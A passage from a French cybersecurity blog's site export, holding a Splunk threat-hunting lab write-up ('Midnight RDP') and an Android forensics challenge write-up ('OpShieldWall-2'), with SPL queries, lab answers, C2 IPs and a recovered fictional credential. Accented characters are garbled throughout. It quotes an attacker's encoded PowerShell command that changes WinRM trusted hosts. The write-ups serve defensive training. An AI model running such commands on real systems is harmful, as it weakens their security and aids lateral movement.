\u0026#34;Event ID\u0026#34;, TaskName as \u0026#34;Scheduled Task\u0026#34;, Command as \u0026#34;Executed Command\u0026#34; | sort _time Question 3 #\rDans le cadre de sa strat√©gie de persistance, l\u0026rsquo;attaquant a cr√©√© un nouveau compte utilisateur. Quel est le nom de ce compte non autoris√© ?\nToujours avec la m√™me requ√™te que pour la question 1 :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort ‚Äî _time On peut y trouver une commande PowerShell encod√©e qui para√Æt tr√®s suspecte :\nOn prend cette commande et on la d√©code via Cyberchef :\nR√©ponse : Administrator\nQuestion 4 #\rPour faciliter l\u0026rsquo;acc√®s √† distance, l\u0026rsquo;attaquant a modifi√© les param√®tres du bureau √† distance. Quel est le nom de la cl√© de registre qui d√©termine si les connexions RDP (Remote Desktop Protocol) sont autoris√©es ?\nAyant d√©j√† investigu√© et administr√© pas mal de Windows, je connaissais d√©j√† la r√©ponse. N√©anmoins, voici comment la trouver :\nOn recherche toujours les commandes PowerShell avec -EncodedCommand, car l\u0026rsquo;attaquant en a ex√©cut√© plusieurs :\nOn y trouve cette commande :\nR√©ponse : fDenyTSConnections\nQuestion 5 #\rDes recherches suppl√©mentaires ont r√©v√©l√© la cr√©ation d\u0026rsquo;un nouveau compte d\u0026rsquo;utilisateur sur le DC. Quel est le nom de ce compte ?\nOn peut supposer que cela a √©t√© fait de la m√™me mani√®re que sur l\u0026rsquo;autre host. On recherche donc :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; host=\u0026#34;DC01\u0026#34; \u0026#34;-EncodedCommand\u0026#34; R√©ponse : rniclos\nPrivilege Escalation #\rQuestion 1 #\rEn examinant la technique d\u0026rsquo;escalade de privil√®ge, quels sont les 6 derniers octets du CLSID de l\u0026rsquo;interface COM privil√©gi√©e que l\u0026rsquo;attaquant a exploit√©e ?\nLe CLSID est un identifiant unique global (GUID) utilis√© par Windows COM (Component Object Model) pour identifier des objets COM dans le registre.\nLes attaquants utilisent des CLSID de COM Interfaces privil√©gi√©es pour ex√©cuter du code avec des privil√®ges √©lev√©s :\nIls exploitent des COM Objects mal configur√©s pour escalader leurs privil√®ges. Un attaquant peut cr√©er, manipuler ou appeler une interface COM privil√©gi√©e* via regsvr32.exe, powershell, mshta.exe ou rundll32.exe. Ici, on sait que le malware est ztssvc.exe. On va donc rechercher tout EventCode \u0026ldquo;1\u0026rdquo; (cr√©ation de processus) li√© √† l\u0026rsquo;ex√©cution de ztssvc.exe et filtrer uniquement sur les IntegrityLevel \u0026ldquo;High\u0026rdquo; :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; EventCode=1 | search Image=\u0026#34;*ztssvc.exe*\u0026#34; | search IntegrityLevel=\u0026#34;High\u0026#34; | table _time User CommandLine IntegrityLevel ParentCommandLine | sort _time R√©ponse : 7CE93B6DC937\nQuestion 2 #\rPour √©lever ses privil√®ges, l\u0026rsquo;attaquant a d√©pos√© un autre fichier sur le syst√®me. Quel est le nom de ce fichier ?\nOn refait la m√™me commande et on v√©rifie tout ce qui s\u0026rsquo;est pass√© apr√®s le t√©l√©chargement du premier fichier (ztssvc.exe) :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | search NOT ParentCommandLine=\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort ‚Äî _time R√©ponse : Akagi64.exe\nDefense Evasion #\rQuestion 1 #\rL\u0026rsquo;attaquant a cherch√© √† modifier le comportement du syst√®me pour affaiblir les param√®tres de s√©curit√©. Quel est le nom de la cl√© de registre qui r√©git les param√®tres de l\u0026rsquo;invite du Contr√¥le de compte d\u0026rsquo;utilisateur (UAC) pour les utilisateurs administratifs ?\nOn trouve la r√©ponse dans les commandes PowerShell encod√©es d√©j√† observ√©es :\nR√©ponse : ConsentPromptBehaviorAdmin\nQuestion 2 #\rPour √©viter d\u0026rsquo;√™tre d√©tect√©, l\u0026rsquo;attaquant a d√©plac√© la balise dans un r√©pertoire prot√©g√© du syst√®me. Quel est le nom de ce fichier malveillant d√©plac√© ?\nS‚Äôil y a eu d√©placement, il devrait y avoir un √©v√©nement de cr√©ation ou de renommage de fichier (Event ID 11 ou 2).\nindex=* sourcetype=xmlwineventlog EventCode=11 OR EventCode=2 \u0026#34;rnichols\u0026#34; | search TargetFilename=\u0026#34;C:\\\\Windows\\\\System32\\\\*\u0026#34; OR TargetFilename=\u0026#34;C:\\\\Windows\\\\SysWOW64\\\\*\u0026#34; OR TargetFilename=\u0026#34;C:\\\\ProgramData\\\\*\u0026#34; | table _time User TargetFilename ProcessName | sort _time R√©ponse : Amazon ZeroTrust Compl.exe\nDiscovery #\rQuestion 1 #\rEn d√©terminant la premi√®re action de l\u0026rsquo;attaquant sur la machine compromise, quelle a √©t√© la premi√®re commande ex√©cut√©e pour recueillir des informations sur le syst√®me ?\nSachant que la machine a √©t√© compromise √† 20:45:27 (cf. question 1 de la partie Execution), on va chercher √† partir de ce moment-l√† :\nindex=* sourcetype=\u0026#34;xmlwineventlog\u0026#34; \u0026#34;rnichols\u0026#34; | rex field=_raw \u0026#34;CommandLine=(?\u0026lt;CommandLine\u0026gt;.*)\u0026#34; | fillnull value=\u0026#34;\u0026#34; | search NOT CommandLine=\u0026#34;\u0026lt;/Data\u0026gt;\u0026lt;/EventData\u0026gt;\u0026lt;/Event\u0026gt;\u0026#34;,\u0026#34;\u0026#34; | search NOT ParentCommandLine=\u0026#34;\u0026#34; | stats values(CommandLine) as CommandLine by _time, ParentCommandLine | sort ‚Äî _time R√©ponse : whoami /groups\nLateral Movement #\rQuestion 1 #\rQuel outil l\u0026rsquo;attaquant a-t-il utilis√© pour se d√©placer lat√©ralement vers le DC ?\nEncore une fois, on va devoir investiguer les commandes PowerShell encod√©es, cette fois-ci celles √©mises par Amazon ZeroTrust Compl.exe.\npowershell -nop -exec bypass -EncodedCommand UwBlAHQALQBJAHQAZQBtACAAVwBTAE0AYQBuADoAXABsAG8AYwBhAGwAaABvAHMAdABcAEMAbABpAGUAbgB0AFwAVAByAHUAcwB0AGUAZABIAG8AcwB0AHMAIAAtAFYAYQBsAHUAZQAgACIARABDADAAMQAuAGEAZAAuAGkAbgBmAGkAbgBpAHQAZQBjAGgAcwBvAGwAdQB0AGkAbwBuAHMALgB4AHkAegAiACAALQBGAG8AcgBjAGUA Cette commande modifie les param√®tres de Windows Remote Management (WinRM) sur IT01 pour faire confiance √† DC01.ad.infinitechsolutions.xyz pour les connexions distantes. C‚Äôest un bon indicateur de mouvement lat√©ral via PowerShell Remoting (WinRM).\nR√©ponse : WinRM\nCommand \u0026amp; Control #\rQuestion 1 #\rEn remontant le fil des activit√©s de l\u0026rsquo;attaquant, quelle √©tait l\u0026rsquo;adresse IP √† partir de laquelle les courriels malveillants ont √©t√© envoy√©s ?\nOn revient aux toutes premi√®res questions en cherchant le user qui a envoy√© le phishing :\nindex=* sourcetype=syslog \u0026#34;User twhite@infinitechsolutions.xyz\u0026#34; R√©ponse : 3.78.253.99\nQuestion 2 #\rPuisque cloud zerotrust compliance.rdp a √©t√© ex√©cut√© sur IT01 et qu‚Äôon conna√Æt l‚Äôadresse IP de l‚Äôexp√©diteur de mail, on peut tester directement :\nindex=* sourcetype=xmlwineventlog (EventCode=1 OR EventCode=3) | search host=\u0026#34;IT01\u0026#34; | search DestinationPort=3389 AND DestinationIp=3.78.253.99 | table _time User DestinationIp DestinationPort | sort _time R√©ponse : 3.78.253.99:3389\nQuestion 3 #\rL\u0026rsquo;analyse a r√©v√©l√© que le fichier d√©pos√© fonctionne comme une balise Cobalt Strike. Quel est le point de terminaison du serveur de commande et de contr√¥le (C\u0026amp;C) avec lequel cette balise communique ?\nPremi√®rement v√©rifions bien quel fichier est le Cobalt Strike beacon :\nEnsuite, on continue l\u0026rsquo;investigation en recherchant √† quelle IP/port s‚Äôest connect√© Amazon ZeroTrust Compl.exe :\nindex=* sourcetype=xmlwineventlog EventCode=3 | search Image=\u0026#34;*Amazon ZeroTrust Compl.exe*\u0026#34; | search NOT DestinationIp=\u0026#34;\u0026#34; | table _time User Image DestinationIp DestinationPort Protocol | sort _time (EventCode 3 correspond √† une connexion r√©seau √©tablie par un processus sur une machine Windows)\nR√©ponse : 3.78.244.11:8080\nQuestion 4 #\rEn examinant la configuration de la DLL, quelle valeur est associ√©e √† la cl√© \u0026lsquo;C2Server\u0026rsquo; qui dirige la communication de la balise ?\nOn retourne sur VirusTotal et on retrouve cette information dans l\u0026rsquo;onglet \u0026ldquo;Behavior\u0026rdquo;.\nR√©ponse : 3.78.244.11,/dot.gif\nLab termin√© !\n","date":"2 mars 2025","externalUrl":null,"permalink":"/blog-cyber/posts/midnight-rdp/","section":"Posts","summary":"Sc√©nario #\rUn employ√© informatique d‚ÄôInfiniTech Solutions a signal√© une activit√© inhabituelle associ√©e √† son compte e-mail.","title":"Midnight RDP Lab","type":"posts"},{"content":"","date":"2 mars 2025","externalUrl":null,"permalink":"/blog-cyber/tags/splunk/","section":"Tags","summary":"","title":"Splunk","type":"tags"},{"content":"","date":"2 mars 2025","externalUrl":null,"permalink":"/blog-cyber/tags/threat-hunting/","section":"Tags","summary":"","title":"Threat Hunting","type":"tags"},{"content":"","date":"19 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/android-forensic/","section":"Tags","summary":"","title":"Android Forensic","type":"tags"},{"content":"","date":"19 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/autopsy/","section":"Tags","summary":"","title":"Autopsy","type":"tags"},{"content":"","date":"19 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"\rSc√©nario #\rNous avons r√©ussi √† confirmer la localisation de l\u0026rsquo;acteur malveillant qui a compromis le r√©seau WiFi de notre gouvernement.\nR√©cemment, un raid √† l\u0026rsquo;aube dans le cadre de l\u0026rsquo;OP ERADICATE a √©t√© men√© √† une adresse dans la capitale v√©lorienne et une quantit√© consid√©rable d\u0026rsquo;√©l√©ments de preuve a √©t√© saisie. On notera en particulier un appareil Android appartenant √† l\u0026rsquo;agent, dont on pense qu\u0026rsquo;il se trouvait sur le lieu de l\u0026rsquo;attaque.\nNous avons besoin de votre expertise pour analyser cet appareil et r√©pondre aux questions d√©taill√©es ci-dessous. Vous n\u0026rsquo;avez pas beaucoup de temps, une r√©union du COBR v√©lorien a √©t√© organis√©e pour discuter de vos r√©sultats\u0026hellip;\nFichiers #\ropshieldwall2.zip contenant \u0026ldquo;EVIDENCE-CASE-RAVENSKIAN-AGENT-002\u0026rdquo; o√π on le retrouve le dossier \u0026ldquo;data\u0026rdquo; et \u0026ldquo;storage\u0026rdquo; d\u0026rsquo;un Android Cela nous laisse pas mal de marge de man≈ìuvre, en effet, le /data contient √©norm√©ment d\u0026rsquo;informations telles que :\nCheatsheet SANS FOR585\rAvant propos #\rAvant de commencer, voici quelques informations importantes sur Android :\nLes donn√©es utilisateur peuvent √™tre stock√©es en interne et en externe sur Android. Les donn√©es internes sont enregistr√©es dans la m√©moire flash NAND, une m√©moire non volatile qui conserve les donn√©es m√™me en cas de coupure d\u0026rsquo;alimentation. La NAND stocke le bootloader, le syst√®me d\u0026rsquo;exploitation et les donn√©es utilisateur. Les donn√©es des applications sont stock√©es sur la m√©moire flash NAND ou sur la carte SD.\nAndroid est bas√© sur des variantes des branches LTS (long-term support) du Kernel Linux. Avec Android v8 (Oreo), Google a impos√© l\u0026rsquo;utilisation de la version 4.4 ou sup√©rieur du Kernel Linux. Par exemple Android v9 (Pie) fonctionne sur les versions 4.4, 4.9 ou 4.14 selon l\u0026rsquo;appareil. Plus d\u0026rsquo;info disponnible sur le wiki d\u0026rsquo;Android OS https://source.android.com/docs/core/architecture/kernel/android-common?hl=fr.\nandroid-mainline¬†est la principale branche de d√©veloppement des fonctionnalit√©s Android. La ligne principale Linux est fusionn√©e avec¬†android-mainline¬†chaque fois que Linus Torvalds publie une version ou une version candidate :\nOn retrouve principalement ces syst√®mes de fichiers :\nEXT4 F2FS YAFFS2 exFAT La plupart des artefacts sont des DB SQLite et des fichiers XML. Android isole les applications au niveau du Kernel, leur attribuant un identifiant unique (UID) pour suivre les applications ex√©cut√©es.\nAndroid Architecture #\rLe noyau Linux constitue la base d\u0026rsquo;Android, supportant des fonctionnalit√©s cruciales telles que les threads et la gestion de la m√©moire de bas niveau utilis√©es par Android Runtime (ART).\nLe HAL fournit des interfaces standardis√©es qui exposent les fonctionnalit√©s mat√©rielles aux API Java de niveau sup√©rieur. Il est compos√© de modules de biblioth√®que sp√©cifiques √† chaque composant mat√©riel (comme la cam√©ra ou le Bluetooth). Lorsqu\u0026rsquo;une API acc√®de au mat√©riel, Android charge le module de biblioth√®que correspondant\nL\u0026rsquo;environnement d\u0026rsquo;ex√©cution Android (Android Runtime dit ART) ex√©cute chaque application dans son propre processus et instance. G√©rant plusieurs machines virtuelles sur des appareils √† faible m√©moire gr√¢ce au bytecode DEX sp√©cialement con√ßu et optimis√© pour Android. Les outils de compilation comme d8 transforment le code Java en bytecode DEX pour l\u0026rsquo;ex√©cution sur Android.\nDe nombreux composants et services syst√®me Android essentiels, tels qu\u0026rsquo;ART et HAL, sont cr√©√©s √† partir de code natif n√©cessitant des biblioth√®ques natives √©crites en C et C++.\nLes fonctionnalit√©s d\u0026rsquo;Android sont accessibles via des API Java, facilitant la r√©utilisation des principaux composants et services syst√®me modulaires comme les notifications, la gestion des ressources et la localisation.\nLes applications syst√®me sont l\u0026rsquo;ensemble des applications de base fournies avec Android.\nAndroid Virtual Machine #\rLes VM sont utilis√©s comme couches d\u0026rsquo;abstraction entre une application et l\u0026rsquo;appareil Android sous-jacent.\nChaque application fonctionne dans sa propre instance dans une VM, isolant les applications les unes des autres.\nLes applications Android sont √©crites en Java mais sont compil√©es et compil√©es en bytecode Java.\nCe bytecode est ensuite transform√© en bytecode Dalvik (fichiers .dex) ou bytecode ART.\nDalvik et ART ex√©cutent le bytecode (.dex) dans une machine virtuelle, permettant aux applications de fonctionner ind√©pendamment du mat√©riel sous-jacent.\nAvant KitKat (v.4.4), Android utilisait des VM Dalvik.\nAvec Lollipop (v5.0), Android a commenc√© √† utiliser Android Runtime (ART) et a cess√© d\u0026rsquo;utiliser la VM Dalvik.\nLes deux environnements d\u0026rsquo;ex√©cution Dalvik et ART fonctionnent avec le bytecode DEX, mais ART poss√®de de nouvelles fonctionnalit√©s d\u0026rsquo;optimisation.\nDirectory structure #\r/cache : peut contenir des pi√®ces jointes gmail, des t√©l√©chargements, des donn√©es de navigation et des mises √† jour OTA /efs : contient des fichiers n√©cessaires au fonctionnement de l\u0026rsquo;appareil en cas de d√©faillance /data : /data/data : contient les dossiers des applications (/data/data/com.example.app), les fichiers de configurations des apps, les DB SQLite des apps, leurs logs, cache etc. /app : contient des fichiers .apk du march√© Android *Des malwares peuvent √™tre trouv√©s ici /backup : stocke l\u0026rsquo;API de sauvegarde pour les d√©veloppeurs donc les donn√©es de sauvegarde des utilisateurs ne sont pas stock√©es ici /media : l\u0026rsquo;emplacement de stockage interne √©quivalent √† une carte SD. *Des malwares malveillants peuvent √™tre trouv√©s ici /misc : les fichiers li√©s √† Bluetooth, dhcp, vpn, Wi-Fi, etc. sont stock√©s ici /system : contient des fichiers cl√©s tels que gesture.key et passwords.key ; le fichier accounts.db qui contient les usernames et les mots de passe pour l\u0026rsquo;authentification des fichiers etc. /property : contient les propri√©t√©s du syst√®me, y compris le fuseau horaire, les param√®tres de langue, etc. /mnt : /asec : stocke les donn√©es non chiffr√©s des apps /DCIM : stocke les thumbnails des albums /Pictures : stocke les images de l\u0026rsquo;appareil photo /downloads : fichiers t√©l√©charg√©s localement /secure/asec : stocke les donn√©es chiffr√©s des apps /system : /app : contient des fichiers .apk. *Des malwares peuvent √™tre trouv√©s ici /priv-app : contient des fichiers \u0026amp; apk avec des permissions au niveau du syst√®me. *Des malwares peuvent √™tre trouv√©s ici Pour avoir plus d\u0026rsquo;informations sur\nles permissions des app : https://developer.android.com/guide/topics/permissions/overview?hl=fr ; https://blog.mindorks.com/what-are-the-different-protection-levels-in-android-permission/ la CLI d\u0026rsquo;Android : https://developer.android.com/tools/adb?hl=fr Setup #\rAu vu des fichiers et du sc√©nario, je vais utiliser l\u0026rsquo;outil Autopsy. Cela peut prendre un peu de temps √† ce setup, c\u0026rsquo;est pour cela que j\u0026rsquo;attaque cela ici.\nSi vous ne connaissez pas Autopsy, voici une bri√®ve description :\nAutopsy est un outil d\u0026rsquo;investigation num√©rique opensource. Il se rapporte √† l\u0026rsquo;interface graphique du Sleuth Kit et d\u0026rsquo;autres outils de forensic. Il est utilis√© pour analyser des disques durs et des smartphones dans le cadre d\u0026rsquo;enqu√™tes. Les fonctionnalit√©s cl√©s d\u0026rsquo;Autopsy incluent la r√©cup√©ration de fichiers supprim√©s, l\u0026rsquo;analyse des m√©tadonn√©es, la recherche par mots-cl√©s, la visualisation des timelines d\u0026rsquo;activit√©s, et l\u0026rsquo;analyse des syst√®mes de fichiers etc.\nPour l\u0026rsquo;utiliser, nous devons cr√©er une \u0026ldquo;Case\u0026rdquo; :\nIci, nous savons que nous n\u0026rsquo;avons pas √† faire √† une \u0026ldquo;Disk Image\u0026rdquo; ou √† une VM, de m√™me pour un disque local. Nous choisissons donc l\u0026rsquo;option appropri√©e \u0026ldquo;Logical Files\u0026rdquo; :\nOn attend qu\u0026rsquo;Autopsy \u0026amp; ses modules terminent l\u0026rsquo;ingestion. Cela peut prendre un moment.\nC\u0026rsquo;est bon, on peut commencer l\u0026rsquo;investigation :\nQuestions #\rQuestion 1 #\rQuelle est l\u0026rsquo;adresse mail de l\u0026rsquo;agent qui a √©t√© utilis√©e dans diverses applications/services ?\nPour y r√©pondre, je vais utiliser le rapport qu\u0026rsquo;Autopsy a g√©n√©r√© via ALEAPP (Android Logs Events And Protobuf Parser), un projet open-source qui vise √† analyser tous les artefacts Android connus √† des fins d\u0026rsquo;analyse forensic.\nPour trouver rapidement et simplement nous pouvons chercher dans :\n/data/data/com.android.vending/databases/library.db pour y trouver le compte google utilis√© pour download des apps /data/data/com.android.providers.contacts/databases/contacts2.db pour y trouver le compte google utilis√© pour synchroniser ses contacts Mais aussi (mais non applicable sur ce challenge) ici :\n/data/com.android.vending/shared_prefs/lastaccount.xml (dernier compte utilis√© sur Google PlayStore (Android 9 et plus)) /data/com.google.android.gms/shared_prefs/BackupAccount.xml (email du compte de backup) /data/com.android.email/databases/EmailProvider.db (email accounts, 3rd party app data et les messages associ√©s aux notifications par emails) Enfin bref, on se retrouve donc avec le rapport en format html :\nOn peut retrouver son adresse mail un peu partout.\nDans l\u0026rsquo;app \u0026ldquo;Chrome\u0026rdquo; par exemple avec la partie \u0026ldquo;Autofill\u0026rdquo; (fonctionnalit√© qui permet de remplir automatiquement des formulaires avec des informations pr√©enregistr√©es) :\nDans les \u0026ldquo;Login Data\u0026rdquo; de Chrome :\nEnfin dans la partie \u0026ldquo;Installed Apps (Library)\u0026rdquo; nous retrouvons l\u0026rsquo;adresse mail du compte google utilis√© pour download des apps :\nR√©ponse : olegpachinksy@gmail.com\nQuestion 2 #\rQuel est le num√©ro de contact du gestionnaire (handler) affect√© √† l\u0026rsquo;agent qui a √©t√© arr√™t√© ?\nDans la partie \u0026ldquo;Contacts\u0026rdquo; :\nR√©ponse : +323145232315\nQuestion 3 #\rR√©cup√©rer les identifiants et le lien du portail officiel des agents ravenskiens. Cela peut nous donner un avantage en mati√®re de renseignement car nous pouvons utiliser cet acc√®s pour obtenir d\u0026rsquo;autres informations exploitables sur les op√©rations que le gouvernement ravenskien planifie.\nNous avons d√©j√† trouv√© la r√©ponse √† cette question √† la question n¬∞1 via les \u0026ldquo;Login Data\u0026rdquo; de Chrome :\nR√©ponse : agent.ravensk.idu.com:olegpachinksy007:HBLKNKD0MADsdfsa2334(*\u0026amp;DSMDB\nQuestion 4 #\rQuel est le code de contact utilis√© pour confirmer l\u0026rsquo;identit√© de l\u0026rsquo;agent et du gestionnaire lors de l\u0026rsquo;utilisation d\u0026rsquo;un canal de discussion s√©curis√© ?\nPremi√®rement je vais v√©rifier les potentiels SMS ici : /data/data/com.android.providers.telephony/databases/mmssms.db.\nNous n\u0026rsquo;y trouvons rien.\nNous pourrions aussi chercher ici mais non applicable sur ce challenge :\n/data/com.google.android.gms/databases/icing_mmssms.db (SMS/MMS) /data/com.google.android.gms/databases/ipa_mmssms.db (SMS/MMS) Nous devons donc trouver l\u0026rsquo;app de messagerie utilis√©. On peut voir toutes les apps install√©es dans la partie \u0026ldquo;Installed Programs\u0026rdquo; d\u0026rsquo;Autopsy :\nOn y trouve diff√©rente cat√©gorie :\nInstalled Apps (GMS) Installed Apps (Library) Installed Apps (Vending) Installed Apps - GMS : Cette cat√©gorie concerne les applications install√©es sur l\u0026rsquo;appareil, quel que soit leur mode d\u0026rsquo;installation. On peut retrouver ces donn√©es ici :¬†/data/com.google.android.gms/databases/.\nInstalled Apps - Library : Cette cat√©gorie se r√©f√®re √† la biblioth√®que d\u0026rsquo;applications pour l\u0026rsquo;utilisateur Google utilisant l\u0026rsquo;appareil. Il est important de noter que cette DB n\u0026rsquo;est pas li√©e aux applications install√©es sur l\u0026rsquo;appareil, elle peut contenir des applications install√©es par le m√™me compte Google sur un autre appareil ou sur une pr√©c√©dente installation de l\u0026rsquo;appareil analys√©. On peut retrouver ces donn√©es ici :¬†/data/com.android.vending/databases/.\nInstalled Apps - Vending : Cette cat√©gorie concerne sp√©cifiquement les applications install√©es sur l\u0026rsquo;appareil via le Google Play Store, excluant celles install√©es par d\u0026rsquo;autres moyens. Ces donn√©es ne sont pas supprim√©es lorsque l\u0026rsquo;application est d√©sinstall√©e. Elles sont stock√©es dans une DB SQLite situ√©e ici : /data/com.android.vending/databases/.\nPour plus de lisibilit√© retournons sur ALEAPP et concentrons-nous sur les apps de type \u0026ldquo;Vending\u0026rdquo; :\nL\u0026rsquo;app qui saute au yeux c\u0026rsquo;est mega.privacy.android.app. Et en effet, c\u0026rsquo;est une application de messagerie :\nJustement ALEAPP a pars√© les messages √©chang√©s via MEGA :\nOn peut retrouver ces infomations ici : /data/data/mega.privacy.android.app/karere-TU1IaTh4TUJpdTQKAfO_2P0qU8NMP7zDRlgv.db.\nR√©ponse : REDAPPLEONACAR\nQuestion 5 #\rLe gestionnaire a partag√© un document avec l\u0026rsquo;agent en utilisant un service de stockage cloud. Quand ce fichier a-t-il √©t√© partag√© avec l\u0026rsquo;agent ?\nRien dans les messages. Le document a donc d√ª √™tre transmis d\u0026rsquo;une autre mani√®re. Nous savons qu\u0026rsquo;il n\u0026rsquo;y a pas d\u0026rsquo;autre app de messagerie et qu\u0026rsquo;il n\u0026rsquo;a pas pu lui communiquer via SMS/MMS.\nDans les app install√© nous avons vu com.google.android.apps.docs. Allons donc chercher ici : \\data\\data\\com.google.android.apps.docs.\nOn y trouve la DB /data/data/com.google.android.apps.docs/app_cello/olegpachinksy@gmail.com/cello.db contenant ces informations :\nOn peut d\u0026rsquo;ailleurs retrouver ce fichier ici : EVIDENCE-CASE-RAVENSKIAN-AGENT-002/storage/emulated/0/Download/Debrief-Velorian OP Expansion East.pdf :\nN√©anmoins attention, par d√©faut Autopsy interpr√®te les timestamps avec la time zone de votre ordinateur. Pensez bien √† modifier ce param√®tre dans Autopsy (Tools \u0026gt; Options \u0026gt; View \u0026gt; Time Zone).\nR√©ponse : 2024-04-01 09:36:41\nQuestion 6 #\rQuel est l\u0026rsquo;URI de t√©l√©chargement du fichier partag√© pr√©c√©demment identifi√© ?\nNous savons que le fichier a √©t√© t√©l√©charg√© car nous l\u0026rsquo;avons retrouv√© dans /storage/emulated/0/Download/.\nNous pouvons donc chercher dans /data/data/com.android.providers.downloads/databases/downloads.db :\nR√©ponse : https://www.googleapis.com/drive/v2internal/files/1iQKKlBU2vuJD1Xet6IYPt7IODVtDHxv1?alt=media\u0026amp;source=downloadUrl\u0026amp;auditContext=fileAction\u0026amp;reason=909\u0026amp;syncType=1\u0026amp;featureLabel=android-sync-classic\u0026amp;openDrive=false\u0026amp;errorRecovery=false\u0026amp;originatorApp=102\nQuestion 7 #\rAfin d\u0026rsquo;obtenir davantage d\u0026rsquo;informations pour le contre-espionnage de Veloria, quel √©tait l\u0026rsquo;objectif principal de cette cyber-op√©ration men√©e par le gouvernement de Ravensk ?\nRevenons au document :\nR√©ponse : Infiltrate the Velorian secured network to gather intelligence on upcoming cyber-attacks, their techniques, and target countries.\nQuestion 8 #\rL\u0026rsquo;identification du gestionnaire est √©galement cruciale pour que les forces de l\u0026rsquo;ordre v√©loriennes puissent comprendre l\u0026rsquo;√©tendue de cette op√©ration. Quelle est l\u0026rsquo;adresse √©lectronique utilis√©e par le manipulateur ?\nNous l\u0026rsquo;avons d√©j√† vu dans les messages de l\u0026rsquo;app MEGA :\nR√©ponse : ivoryalex783@gmail.com\nQuestion 9 #\rQuel est le nom de l\u0026rsquo;endroit o√π l\u0026rsquo;agent et le gestionnaire se sont rencontr√©s ?\nRevenons aux messages :\nC\u0026rsquo;est la question qui m\u0026rsquo;a pris le plus de temps, j\u0026rsquo;ai d√ª bloquer une bonne heure dessus.\nPremi√®rement, j\u0026rsquo;ai cherch√© dans les endroits habituels :\n/data/com.google.android.apps.maps/databases/gmm_storage.db /data/com.google.android.apps.maps/databases/search_history.db /data/com.google.android.apps.maps/databases/da_destination_history /data/com.sec.android.daemonapp/db/weatherClock /data/com.google.android.apps.maps/app_tts-cache/ /data/com.google.android.apps.maps/cache/image_manager_disk_cache/ Apr√®s n\u0026rsquo;avoir rien trouv√©, je me suis dit qu\u0026rsquo;il √©tait sans doute possible que la r√©ponse soit dans les metadatas des images sur le t√©l√©phone. En effet, on retrouve 48 images dont plusieurs de bar :\nN√©anmoins, rien de probant.\nJe me suis donc pos√© plusieurs questions :\nil y a-t-il d\u0026rsquo;autres applications de navigation / localisation sur le t√©l√©phone ? est-il s√ªr que je dois chercher dans l\u0026rsquo;app Google Maps ? Non, seulement Google Maps. Non, il est peut-√™tre possible qu\u0026rsquo;il ait fait la recherche sur son navigateur et non sur l\u0026rsquo;app etc. Ayant d√©j√† v√©rifi√© les points habituels des artefacts de google maps j\u0026rsquo;ai pr√©f√©r√© chercher dans le navigateur mais je n\u0026rsquo;ai rien trouv√©.\nJe suis donc retourn√© fouiller dans les artefacts de google maps :\napp : RAS app_offline_downloads : RAS app_offline_hashes : RAS app_textures : RAS app_webview : RAS cache : RAS databases : trop de fichiers, j\u0026rsquo;y reviendrai plus tard files : \u0026ldquo;new_recent_history_cache_search.cs\u0026rdquo; Je me rends compte que j\u0026rsquo;aurais simplement pu chercher par mot-cl√© \u0026ldquo;Pub\u0026rdquo; ü§°\nR√©ponse : Levstik Pub\nQuestion 10 #\rD\u0026rsquo;apr√®s le chat retrouv√© entre l\u0026rsquo;agent et le gestionnaire, il semble que ce dernier ait envoy√© √† l\u0026rsquo;agent arr√™t√© une image relative √† l\u0026rsquo;infrastructure utilis√©e par le gouvernement ravenskien pour cette op√©ration de cyberespionnage. Quel est le cadre C2 utilis√© par le gouvernement ravenskien ?\nAyant d√©j√† v√©rifi√© toutes les images pour r√©pondre √† la question 9 j\u0026rsquo;ai d√©j√† la r√©ponse.\nR√©ponse : Empire\nQuestion 11 #\rLa collecte d\u0026rsquo;informations sur l\u0026rsquo;infrastructure, telles que les adresses IP ou les noms d\u0026rsquo;h√¥tes, est cruciale pour les autorit√©s v√©loriennes, qui pr√©parent une op√©ration de contre-offensive. D\u0026rsquo;apr√®s l\u0026rsquo;image r√©cup√©r√©e envoy√©e par le gestionnaire √† l\u0026rsquo;agent, quelle est l\u0026rsquo;adresse IP de l\u0026rsquo;un des serveurs C2 exploit√©s par les acteurs de la menace ravenskiens ?\nR√©ponse : 98.24.12.45\n","date":"19 mai 2024","externalUrl":null,"permalink":"/blog-cyber/posts/opshieldwall-2/","section":"Posts","summary":"Sc√©nario #\rNous avons r√©ussi √† confirmer la localisation de l\u0026rsquo;acteur malveillant qui a compromis le r√©seau WiFi de notre gouvernement.","title":"OpShieldWall-2","type":"posts"},{"content":"","date":"7 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"7 mai 2024","externalUrl":null,"permalink":"/blog-cyber/tags/network-forensic/","section":"Tags","summary":"","title":"Network Forensic","type":"tags"},{"content":"\rSc√©nario #\rMerci d\u0026rsquo;avoir r√©pondu √† notre appel. Le minist√®re de la D√©fense de Velorian a d√©sesp√©r√©ment besoin d\u0026rsquo;aide\u0026hellip;\nNous devons rester discrets, mais nous pensons que le Wi-Fi public des bureaux du minist√®re de la D√©fense de Velorian a √©t√© compromis. L\u0026rsquo;impact semble faible, mais les diagrammes du r√©seau montrent qu\u0026rsquo;aucune segmentation r√©elle du r√©seau n\u0026rsquo;a √©t√© r√©alis√©e et que le trafic entre les 